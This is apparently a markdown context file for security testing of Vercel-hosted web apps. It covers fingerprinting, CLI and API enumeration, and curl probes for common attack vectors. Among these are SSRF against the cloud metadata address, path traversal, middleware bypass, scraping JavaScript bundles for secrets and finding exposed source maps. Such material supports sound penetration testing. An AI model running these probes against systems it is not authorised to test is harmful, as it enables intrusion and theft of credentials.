# Vercel Security Testing Context

The `vercel` CLI is available. Use it for deployment enumeration and project configuration auditing alongside standard HTTP-based testing.

## Identifying Vercel-Hosted Targets

```bash
# Fingerprint Vercel hosting
curl -sI https://TARGET | grep -iE 'x-vercel|server.*vercel'
dig +short CNAME TARGET
# Look for: cname.vercel-dns.com or 76.76.21.21
```

Key indicators:
- **Headers:** `x-vercel-id`, `x-vercel-cache`, `server: Vercel`
- **DNS:** CNAME to `cname.vercel-dns.com`
- **Deployment URLs:** `<project>-<hash>-<team>.vercel.app`

## Vercel CLI Reconnaissance

### Project & Deployment Enumeration

```bash
# List projects (requires vercel login or VERCEL_TOKEN)
vercel projects ls

# List deployments for a project
vercel ls PROJECT_NAME

# Inspect a specific deployment
vercel inspect DEPLOYMENT_URL

# Get project environment variable names
vercel env ls
vercel env ls --environment production
vercel env ls --environment preview
vercel env ls --environment development
```

### Domain & DNS Configuration

```bash
# List domains associated with the project
vercel domains ls

# Inspect domain config
vercel domains inspect DOMAIN
```

### Using the Vercel REST API Directly

If `VERCEL_TOKEN` is set, you can query the API for deeper inspection:

```bash
# List all projects
curl -sH "Authorization: Bearer $VERCEL_TOKEN" \
  "https://api.vercel.com/v9/projects" | python3 -m json.tool

# List deployments with metadata (branch, commit, etc.)
curl -sH "Authorization: Bearer $VERCEL_TOKEN" \
  "https://api.vercel.com/v6/deployments?projectId=PROJECT_ID&limit=50" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"{x['url']} {x['state']} {x.get('meta',{}).get('githubCommitRef','')}\") for x in d['deployments']]"

# List env var names (not values)
curl -sH "Authorization: Bearer $VERCEL_TOKEN" \
  "https://api.vercel.com/v9/projects/PROJECT_ID/env" | \
  python3 -c "import sys,json; [print(f\"{e['key']} targets={e['target']}\") for e in json.load(sys.stdin)['envs']]"

# Get project configuration (redirects, headers, rewrites)
curl -sH "Authorization: Bearer $VERCEL_TOKEN" \
  "https://api.vercel.com/v9/projects/PROJECT_ID" | python3 -m json.tool
```

## Common Attack Vectors

### Preview Deployment Exposure
Every PR/branch gets a unique deployment URL that may contain debug endpoints, staging secrets, or unreviewed vulnerable code.

```bash
# Try common branch-based preview URLs
for branch in develop staging dev feature-api main; do
  url="https://PROJECT-git-${branch}-TEAM.vercel.app"
  code=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  echo "${branch}: ${code} ($url)"
done
```

### Environment Variable Leakage
- `NEXT_PUBLIC_*` vars are bundled into client-side JavaScript

```bash
# Search webpack bundles for leaked env vars
for chunk in $(curl -s "https://TARGET" | grep -oE '/_next/static/chunks/[a-z0-9-]+\.js' | head -20); do
  curl -s "https://TARGET${chunk}" | grep -oiE '(api[_-]?key|secret|token|password|auth)["\x27]?\s*[:=]\s*["\x27][^"'\'']{8,}' && echo "  Found in: ${chunk}"
done
```

### Serverless Function Vulnerabilities
API routes at `/api/*` run as serverless functions.

```bash
# Discover API routes from client-side code
curl -s "https://TARGET" | grep -oE '/api/[a-zA-Z0-9/_-]+' | sort -u

# Test path traversal in dynamic routes
curl -s "https://TARGET/api/users/../../admin"

# Test SSRF in server-side fetching
curl -s "https://TARGET/api/preview?url=http://169.254.169.254/latest/meta-data/"

# Test missing auth on API routes
curl -s "https://TARGET/api/admin/users"
```

### Edge Middleware Bypass

```bash
# Direct deployment URL bypasses custom domain middleware
curl -s "https://PROJECT-HASH-TEAM.vercel.app/admin"

# Path normalization differences
curl -s "https://TARGET/api/../admin"
curl -s "https://TARGET//admin"

# x-middleware-prefetch header
curl -sH "x-middleware-prefetch: 1" "https://TARGET/protected-page"
```

### Build Output & Source Maps

```bash
# Check for accessible source maps (exposes original source code)
curl -sI "https://TARGET/_next/static/chunks/main.js.map"

# ISR/SSR data routes
BUILD_ID=$(curl -s "https://TARGET/_next/static/buildManifest.js" 2>/dev/null | grep -oE '[a-zA-Z0-9_-]{20,}' | head -1)
curl -s "https://TARGET/_next/data/${BUILD_ID}/index.json" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -50
```

### Security Header Audit

```bash
curl -sI "https://TARGET" | grep -iE 'content-security|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy'
```
